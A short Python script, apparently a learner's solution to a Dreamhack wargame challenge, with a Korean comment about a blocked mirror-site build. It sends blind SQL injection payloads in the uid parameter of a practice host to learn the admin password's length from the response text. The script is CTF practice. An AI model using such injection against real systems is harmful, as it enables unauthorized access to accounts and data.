'''
왜 미러사이트에서 빌드가 막히는지 모르겠음.
걍 강의 보고 이해해보겠습니다
'''

from requests import get

host = "http://host3.dreamhack.games:22019/"

pw_len = 0
while True:
    pw_len += 1
    query = f"admin' and char_length(upw)={pw_len}-- -"
    res = get(f"{host}/?uid={query}")
    
    if "exists" in res.text:
        break

print(f"pw_len : {pw_len}")

